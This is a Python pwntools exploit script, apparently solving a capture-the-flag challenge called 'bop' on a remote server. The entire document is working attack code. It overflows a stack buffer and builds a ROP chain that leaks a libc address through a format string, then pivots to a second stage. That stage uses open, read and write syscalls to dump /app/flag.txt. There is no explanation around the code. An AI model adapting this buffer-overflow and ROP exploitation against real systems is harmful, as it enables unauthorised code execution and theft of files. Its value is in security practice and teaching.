#!/usr/bin/env python
from pwn import process, p64, gdb, remote, ELF, ROP, context
import time

context.terminal = '/usr/bin/kitty'
context.arch = 'amd64'

DEBUG = False
gdbscript = """
b *0x404580
c
"""

elf = ELF('./bop_patched')
libc = ELF('./libc-2.31.so')

# p = process('./bop_patched')
# p = gdb.debug(elf.file.name, gdbscript=gdbscript)
p = remote('mc.ax', 30284)

rop_elf = ROP(elf)

gets = 0x00401100
printf = 0x004010f0
pop_rdi = 0x4013d3

payload = b'A'*0x20
payload += p64(elf.bss(0x500))
payload += p64(pop_rdi)
payload += p64(elf.bss(0x500))
payload += p64(gets)    # get format string
payload += p64(pop_rdi)
payload += p64(elf.bss(0x500))
payload += p64(printf)  # print libc addr
payload += p64(pop_rdi)
payload += p64(elf.bss(0x508))
payload += p64(gets)    # 2nd stage payload to bss
payload += p64(rop_elf.find_gadget(['leave', 'ret'])[0])


p.sendlineafter(b'bop? ', payload)

time.sleep(0.1)

payload = b'%p___'

p.sendline(payload)

libc.address = int(p.recvuntil(b'___')[
                   :-3], 16) + 0x007ff4dc8aa000 - 0x007ff4dca96a03

info("Libc base %s", hex(libc.address))

rop = ROP(libc)

pop_rsi = libc.address + 0x00196eb0
pop_rdx = libc.address + 0x00142c92
pop_rax = libc.address + 0x0015fa19
syscall = libc.address + 0x0013a5ab


payload = b''
payload += p64(pop_rdi)
payload += p64(libc.bss(0x500))
payload += p64(gets)

# open
payload += p64(pop_rdi)
payload += p64(libc.bss(0x500))
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(2)
payload += p64(syscall)

# read
payload += p64(pop_rax)
payload += p64(0)
payload += p64(pop_rdi)
payload += p64(3)
payload += p64(pop_rsi)
payload += p64(libc.bss(0x600))
payload += p64(pop_rdx)
payload += p64(0x50)
payload += p64(syscall)

# write
payload += p64(pop_rax)
payload += p64(1)
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi)
payload += p64(libc.bss(0x600))
payload += p64(pop_rdx)
payload += p64(56)
payload += p64(syscall)

# exit
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(0x3c)
payload += p64(syscall)

p.sendline(payload)

if DEBUG:
    p.sendline(b"/flag")
else:
    p.sendline(b"/app/flag.txt")

p.interactive()
